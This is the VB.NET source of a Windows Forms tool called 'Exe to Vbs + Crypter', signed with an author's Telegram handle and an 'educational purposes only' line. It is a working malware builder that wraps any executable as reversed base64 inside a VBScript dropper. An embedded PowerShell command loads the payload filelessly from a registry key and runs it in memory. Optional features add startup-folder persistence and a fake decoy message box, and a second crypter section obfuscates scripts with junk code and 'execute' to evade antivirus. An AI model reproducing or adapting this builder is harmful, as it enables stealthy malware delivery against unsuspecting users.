Imports System.IO
Imports System.ComponentModel
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Threading.Tasks
Imports System.Threading
Imports System.Text
Imports Exe_to_Vbs.My
Imports System
Imports System.Collections.Generic
Imports System.Drawing
Imports System.Windows.Forms


'│ Author       : suXjung
'│ Name         : Exe to Vbs + Crypter
'│ Tel          : @sujung02 

'This program Is distributed For educational purposes only.



Public Class Form1
    Dim Messagebox_Title As String = "Tel : @sujung02"
	Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
		Control.CheckForIllegalCrossThreadCalls = False
		Me.Timer1.Enabled = True
		Me.Timer2.Enabled = True
		Me.Opacity = 0.95
		Me.ComboBox2.SelectedIndex = 0
	End Sub

	Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
		MessageBox.Show(Me, vbCrLf & "       │ Author         suXjung" & vbCrLf & "       │ Name          Exe To Vbs © 2022" & vbCrLf & "       │ Tel              @sujung02" & vbCrLf, Messagebox_Title, MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
	End Sub

	Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Me.Text = DateTime.Now.ToString("yyyy.MM.dd. | HH:mm:ss")
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim OpenFileDialog As New OpenFileDialog
        With OpenFileDialog
            .Title = ""
            .ShowDialog()
        End With
        TextBox1.Text = OpenFileDialog.FileName
    End Sub

	Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
		Try
			Dim fFindFile As New System.IO.FileInfo(Me.TextBox1.Text)
			If fFindFile.Exists = False Then
				MessageBox.Show("File not exists.", Messagebox_Title, MessageBoxButtons.OK, MessageBoxIcon.Error)
			Else
				Button5.Enabled = True
				If MessageBox.Show("Reverse String?", Messagebox_Title, MessageBoxButtons.YesNo, MessageBoxIcon.Information) = DialogResult.Yes Then
					RichTextBox1.Text = StrReverse(Convert.ToBase64String(File.ReadAllBytes(TextBox1.Text)))
					Me.CheckBox1.Enabled = True
					Me.CheckBox2.Enabled = True
					Me.CheckBox3.Enabled = True
					Me.NumericUpDown1.Enabled = True
					Me.Button4.Enabled = True
				Else
					RichTextBox1.Text = Convert.ToBase64String(File.ReadAllBytes(TextBox1.Text))
					Me.CheckBox1.Enabled = True
					Me.CheckBox2.Enabled = True
					Me.CheckBox3.Enabled = True
					Me.NumericUpDown1.Enabled = True
					Me.Button4.Enabled = True
				End If
			End If
		Catch ex As Exception
			MessageBox.Show(ex.Message, Messagebox_Title, MessageBoxButtons.OK, MessageBoxIcon.Error)
		End Try

	End Sub

	Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        RichTextBox1.SelectAll()
        RichTextBox1.Copy()
        MessageBox.Show("Copied", Messagebox_Title, MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            Me.TextBox2.Enabled = True
        ElseIf CheckBox1.Checked = False Then
            Me.TextBox2.Enabled = False
            Me.TextBox2.Text = "Payload"
        End If
    End Sub

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged
        If CheckBox3.Checked = True Then
            Me.Label1.Enabled = True
            Me.Label2.Enabled = True
            Me.Label3.Enabled = True
            Me.TextBox3.Enabled = True
            Me.TextBox4.Enabled = True
            Me.ComboBox1.Enabled = True
			Me.Button5.Enabled = True
			Me.Button4.Enabled = False
		ElseIf CheckBox3.Checked = False Then
            Me.Label1.Enabled = False
            Me.Label2.Enabled = False
            Me.Label3.Enabled = False
            Me.TextBox3.Enabled = False
            Me.TextBox4.Enabled = False
            Me.ComboBox1.Enabled = False
			Me.Button5.Enabled = False
			Me.Button4.Enabled = True
		End If
    End Sub

    Public Function FAKE_CHECK()
        If (String.IsNullOrWhiteSpace(Me.TextBox3.Text) OrElse String.IsNullOrWhiteSpace(Me.TextBox4.Text) OrElse String.IsNullOrWhiteSpace(Me.ComboBox1.Text)) Then
            MessageBox.Show("Erorr", Messagebox_Title, MessageBoxButtons.OK, MessageBoxIcon.Information)
            Return False
        Else
            Return True
        End If
    End Function

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Dim icon As MessageBoxIcon
        If FAKE_CHECK() = True Then
            If Me.ComboBox1.Text = "Critical" Then
                icon = MessageBoxIcon.Error
            ElseIf Me.ComboBox1.Text = "Question" Then
                icon = MessageBoxIcon.Question
            ElseIf Me.ComboBox1.Text = "Exclamation" Then
                icon = MessageBoxIcon.Exclamation
            ElseIf Me.ComboBox1.Text = "Information" Then
                icon = MessageBoxIcon.Information
            End If
			MessageBox.Show(Me.TextBox4.Text, Me.TextBox3.Text, MessageBoxButtons.OK, icon)

			Me.Button4.Enabled = True
		End If
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        If Me.CheckBox1.Checked AndAlso String.IsNullOrWhiteSpace(Me.TextBox2.Text) Then
            MessageBox.Show("Startup Name Error", Messagebox_Title, MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If

        Dim text As String = My.Resources.code
        Dim text2 As String = " $text = ((Get-ItemProperty HKCU:\Software\#name\).#name); $text = -join $text[-1..-$text.Length]; [AppDomain]::CurrentDomain.Load([Convert]::FromBase64String($text)).EntryPoint.Invoke($Null,$Null);"
        Dim stringBuilder As StringBuilder = New StringBuilder()
        Dim text3 As String = Strings.StrReverse(Convert.ToBase64String(File.ReadAllBytes(Me.TextBox1.Text)))
        Dim text4 As String = "A" & Path.GetRandomFileName().Replace(".", "")
        Dim text5 As String = "A" & Path.GetRandomFileName().Replace(".", "")
        Dim num As Integer = text3.Length / 4
        Dim length As Integer = text3.Length
        Dim list As List(Of String) = New List(Of String)()
        Dim i As Integer = 0

        While i < length

            If i + num > length Then
                num = length - i
            End If

            stringBuilder.Append(String.Concat(New String() {text4, i.ToString(), "=""", text3.Substring(i, num), """" & vbCrLf}))
            list.Add(text4 & i.ToString())
            i += num
        End While

        stringBuilder.Append(text5 & " = ")
        text = text.Replace("#sleep", Me.NumericUpDown1.Value.ToString()).Replace("#B64", text5).Replace("#base64", stringBuilder.Append(String.Join(" + ", list)).ToString()).Replace("#name", Me.TextBox2.Text)

        If Me.CheckBox1.Checked Then
            text = text.Replace("'#startup ", "")
            text = text.Replace("#startup", "Copy-Item '"" & currentPath & ""' '"" & startPath & ""';")
        Else
            text = text.Replace("#startup ", "")
        End If

        text2 = text2.Replace("#name", Me.TextBox2.Text)
        text = text.Replace("#PS1", Convert.ToBase64String(Encoding.Unicode.GetBytes(text2)))

        If CheckBox3.Checked = True Then
            If FAKE_CHECK() = True Then
                text = text.Replace("%Remark%", "")
                text = text.Replace("%MsgBox_Msg%", Me.TextBox4.Text)
                text = text.Replace("%MsgBox_Title%", Me.TextBox3.Text)
				text = text.Replace("%MsgBox_Icon%", "vb" & Me.ComboBox1.Text)
			End If
        ElseIf CheckBox3.Checked = False Then
            text = text.Replace("%Remark%", "'")
            text = text.Replace("%MsgBox_Msg%", "")
            text = text.Replace("%MsgBox_Title%", "")
            text = text.Replace("%MsgBox_Icon%", "")
        End If

        Using saveFileDialog As SaveFileDialog = New SaveFileDialog()
            saveFileDialog.Filter = "*.vbs|*.vbs"

            If saveFileDialog.ShowDialog() = DialogResult.OK Then
                File.WriteAllText(saveFileDialog.FileName, text)
                MessageBox.Show("Complete!", Messagebox_Title, MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            End If
        End Using
    End Sub




    ' 크립터
    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        Dim openFileDialog As OpenFileDialog = New OpenFileDialog()
        Dim openFileDialog2 As OpenFileDialog = openFileDialog
        openFileDialog2.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
        openFileDialog2.Filter = "|*.vbs"
        Dim flag As Boolean = openFileDialog2.ShowDialog() = DialogResult.OK
        If flag Then
            Me.TextBox5.Text = openFileDialog2.FileName
			Me.Button7.Enabled = True
		End If
        openFileDialog2.Dispose()
    End Sub

	Private Async Function Junckcodercreate() As Task(Of String)
		Dim T As Task(Of String) = Task.Run(Of String)(Async Function()
														   Dim s As String = "qwertyuiopasdfghjklzxcvbnm"
														   Dim roda As Random = New Random()
														   Dim save As String = String.Empty
														   Dim x As Integer = 0
														   Do
															   Application.DoEvents()
															   Thread.Sleep(1)
															   save += s.Substring(roda.[Next](0, s.Length), 1)
															   x += 1
														   Loop While x <= 10
														   Return Await Task.FromResult(Of String)(save)
													   End Function)
		Return Await T
	End Function


	Private Async Function Add_Junckcode(b As Boolean) As Task(Of String)
		Dim T As Task(Of String) = Task.Run(Of String)(Async Function()
														   Dim s As String = "◙¶☻♪♫☼►◄↕‼↨§↑↓→←∟↔▼"
														   Dim roda As Random = New Random()
														   Dim codigo As String = String.Empty
														   Dim x As Integer = 0
														   Do
															   Application.DoEvents()
															   Thread.Sleep(1)
															   Dim codogigerado As String = Await Me.Junckcodercreate()
															   If b Then
																   Dim values As String() = New String() {codigo, "Dim ", codogigerado, " : ", codogigerado, " = """, s.Substring(roda.[Next](0, s.Length), 1), """" & vbCrLf}
																   codigo = String.Concat(values)
															   Else
																   Dim values As String() = New String() {codigo, "var ", codogigerado, " ;;;;;;;;;;;;;; ", codogigerado, " = """, s.Substring(roda.[Next](0, s.Length), 1), """;;;;;;;;;;;;;;;" & vbCrLf}
																   codigo = String.Concat(values)
															   End If
															   Me.Label5.Text = "Adding " + codogigerado
															   x += 1
														   Loop While x <= 20
														   Return Await Task.FromResult(Of String)(codigo)
													   End Function)
		Return Await T
	End Function




	Private Async Sub VBScript()
		Try
			If Not File.Exists(Me.TextBox5.Text) Then
				Me.TextBox5.Clear()
				Me.Button7.Enabled = False
				MessageBox.Show("File Exists Error", Messagebox_Title, MessageBoxButtons.OK, MessageBoxIcon.Error)
			ElseIf Operators.CompareString(Me.ComboBox2.Text, Nothing, False) = 0 Then
				Me.Button7.Enabled = False
				Interaction.MsgBox("Selcet Value", MsgBoxStyle.OkOnly, Messagebox_Title)
			Else
				Dim Data As String = String.Empty
				Dim i As String = String.Empty
				Dim s As String = File.ReadAllText(Me.TextBox5.Text)
				If Operators.CompareString(s, Nothing, False) = 0 Then
					Me.Button7.Enabled = False
					Interaction.MsgBox("No file content.", MsgBoxStyle.OkOnly, Messagebox_Title)
				Else
					Me.Button7.Enabled = False
					Dim Key As String = Me.RichTextBox2.Text

					' 시작
					Data += "'" & "Crypted by suXjung | " & Me.Text & vbCrLf


					Data = Data + String.Empty + vbCrLf
					Data = Data + "Dim " + Key + vbCrLf
					Dim Total_de_Linhas As Integer = Strings.Split(s, vbCrLf, -1, CompareMethod.Binary).Length
					Me.ProgressBar1.Maximum = Total_de_Linhas - 1
					If Total_de_Linhas - 1 = 0 Then
						Me.ProgressBar1.Maximum = 1
					End If
					If Me.CheckBox4.Checked Then
						Data += Await Me.Add_Junckcode(True)
					End If
					Dim T As Thread = New Thread(Sub()
													 Dim num As Integer = 0
													 Dim num2 As Integer = Total_de_Linhas - 1
													 Dim num3 As Integer = num
													 Dim flag As Boolean
													 While True
														 Dim num4 As Integer = num3
														 Dim num5 As Integer = num2
														 If num4 > num5 Then
															 Exit While
														 End If
														 Application.DoEvents()
														 Me.ProgressBar1.Increment(1)
														 Dim text As String = Strings.Split(s, vbCrLf, -1, CompareMethod.Binary)(num3)
														 text = Strings.Replace(text, """", Me.ComboBox2.Text + """""____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "a", Me.ComboBox2.Text + "a____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "b", Me.ComboBox2.Text + "b____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "c", Me.ComboBox2.Text + "c____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "d", Me.ComboBox2.Text + "d____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "e", Me.ComboBox2.Text + "e____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "f", Me.ComboBox2.Text + "f____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "g", Me.ComboBox2.Text + "g____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "p", Me.ComboBox2.Text + "p____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "m", Me.ComboBox2.Text + "m____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "s", Me.ComboBox2.Text + "s____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "t", Me.ComboBox2.Text + "t____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "i", Me.ComboBox2.Text + "i____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "n", Me.ComboBox2.Text + "n____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "r", Me.ComboBox2.Text + "r____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "l", Me.ComboBox2.Text + "l____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "w", Me.ComboBox2.Text + "w____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "j", Me.ComboBox2.Text + "j____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "k", Me.ComboBox2.Text + "k____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "u", Me.ComboBox2.Text + "u____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "x", Me.ComboBox2.Text + "x____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "h", Me.ComboBox2.Text + "h____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "o", Me.ComboBox2.Text + "o____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "0", Me.ComboBox2.Text + "0____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "1", Me.ComboBox2.Text + "1____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "2", Me.ComboBox2.Text + "2____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "3", Me.ComboBox2.Text + "3____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "4", Me.ComboBox2.Text + "4____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "5", Me.ComboBox2.Text + "5____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "6", Me.ComboBox2.Text + "6____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "7", Me.ComboBox2.Text + "7____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "8", Me.ComboBox2.Text + "8____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "9", Me.ComboBox2.Text + "9____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "}", Me.ComboBox2.Text + "}____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "{", Me.ComboBox2.Text + "{____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "[", Me.ComboBox2.Text + "[____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "]", Me.ComboBox2.Text + "]____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, ";", Me.ComboBox2.Text + ";____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "=", Me.ComboBox2.Text + "=____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "+", Me.ComboBox2.Text + "+____|$|____", 1, -1, CompareMethod.Binary)

														 text = Strings.Replace(text, "-", Me.ComboBox2.Text + "-____|$|____", 1, -1, CompareMethod.Binary)

														 flag = (num3 = 0 And num3 = Total_de_Linhas - 1)
														 If flag Then
															 Data = String.Concat(New String() {Data, Key, " = """, text, """" & vbCrLf})
															 Data += vbCrLf
															 Data = String.Concat(New String() {Data, Key, " = replace(", Key, ",""____|$|____"", """")" & vbCrLf})
															 Data += vbCrLf
															 Data = String.Concat(New String() {Data, Key, " = replace(", Key, ",""", Me.ComboBox2.Text, """, """")" & vbCrLf})
															 Data += vbCrLf

															 Data = Data + "execute " + Key + vbCrLf
														 Else
															 flag = (num3 = 0)
															 If flag Then
																 Data = String.Concat(New String() {Data, Key, " = """, text, """ & _" & vbCrLf})
															 Else
																 flag = (num3 = Total_de_Linhas - 1)
																 If flag Then
																	 Data = Data + "vbCrLf & """ + text + """" & vbCrLf
																	 Data += "on error resume next" & vbCrLf
																	 Data += "xxxxxxxxxxxxxxxxxxxxxxx" & vbCrLf
																	 Data = String.Concat(New String() {Data, Key, " = replace(", Key, ",""____|$|____"","""")" & vbCrLf})
																	 Data += "xxxxxxxxxxxxxxxxxxxxxxx" & vbCrLf
																	 Data = String.Concat(New String() {Data, Key, " = replace(", Key, ",""", Me.ComboBox2.Text, """, """")" & vbCrLf})
																	 Data += "xxxxxxxxxxxxxxxxxxxxxxx" & vbCrLf

																	 Data = Data + "execute " + Key + vbCrLf
																 Else
																	 flag = (num3 > 0 And num3 < Total_de_Linhas - 1)
																	 If flag Then
																		 Data = Data + "vbCrLf & """ + text + """ & _" & vbCrLf
																	 End If
																 End If
															 End If
														 End If
														 num3 += 1
													 End While
													 Me.Label5.Text = "Done."
													 Dim saveFileDialog As SaveFileDialog = New SaveFileDialog()
													 Dim saveFileDialog2 As SaveFileDialog = saveFileDialog
													 saveFileDialog2.FileName = "Crypted"
													 saveFileDialog2.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
													 saveFileDialog2.Filter = "|*.vbs"
													 flag = (saveFileDialog2.ShowDialog() = DialogResult.OK)
													 If flag Then
														 Dim flag2 As Boolean = File.Exists(saveFileDialog2.FileName)
														 If flag2 Then
															 File.Delete(saveFileDialog2.FileName)
														 End If
														 Dim streamWriter As StreamWriter = New StreamWriter(saveFileDialog2.FileName, False, Encoding.Unicode)
														 streamWriter.Write(Data)
														 streamWriter.Close()
														 streamWriter.Dispose()

														 ' Me.Button7.Enabled = False
														 MessageBox.Show(Me, "Complete", Messagebox_Title, MessageBoxButtons.OK, MessageBoxIcon.Information)
													 Else
														 Me.Button7.Enabled = True
													 End If
													 saveFileDialog2.Dispose()
												 End Sub)
					T.SetApartmentState(ApartmentState.STA)
					T.Start()
				End If
				Me.Button7.Enabled = True
			End If
			Me.Timer2.Enabled = True
		Catch ex As Exception
			Me.Timer2.Enabled = True
			MessageBox.Show(Me, ex.ToString(), Messagebox_Title, MessageBoxButtons.OK, MessageBoxIcon.Error)
			Me.Button7.Enabled = True
		End Try
	End Sub


	' 하나하나 입력
	Private Sub RodaString(I As Integer)
		Dim text As String = "qwertyuiopasdfghjklzxcvbnm"
		Dim random As Random = New Random()
		Dim num As Integer = 0
		Dim num2 As Integer = I - 1
		Dim num3 As Integer = num
		While True
			Dim num4 As Integer = num3
			Dim num5 As Integer = num2
			If num4 > num5 Then
				Exit While
			End If
			Application.DoEvents()
			' Thread.Sleep(0)
			Dim textBox As RichTextBox = Me.RichTextBox2
			textBox.Text += text.Substring(random.[Next](0, text.Length), 1)
			num3 += 1
		End While
	End Sub



	' 바로출력
	Public Shared Function gen(I As Integer)
		Dim text As String = "qwertyuiopasdfghjklzxcvbnm"
		Dim random As Random = New Random()
		Dim num As Integer = 0
		Dim num2 As Integer = I - 1
		Dim num3 As Integer = num
		Dim text2 As String
		While True
			Dim num4 As Integer = num3
			Dim num5 As Integer = num2
			If num4 > num5 Then
				Exit While
			End If
			Application.DoEvents()
			' Thread.Sleep(1)
			text2 += text.Substring(random.[Next](0, text.Length), 1)
			num3 += 1
		End While
		Return text2
	End Function


	Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
		Me.RichTextBox2.Clear()
		Dim thread As Thread = New Thread(Sub()
											  Me.RichTextBox2.Text = gen(Convert.ToInt32(Me.NumericUpDown2.Value))
										  End Sub)
		thread.Start()
	End Sub

	Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
		Me.Timer2.Enabled = False
		Me.ProgressBar1.Value = 0
		VBScript()
	End Sub
End Class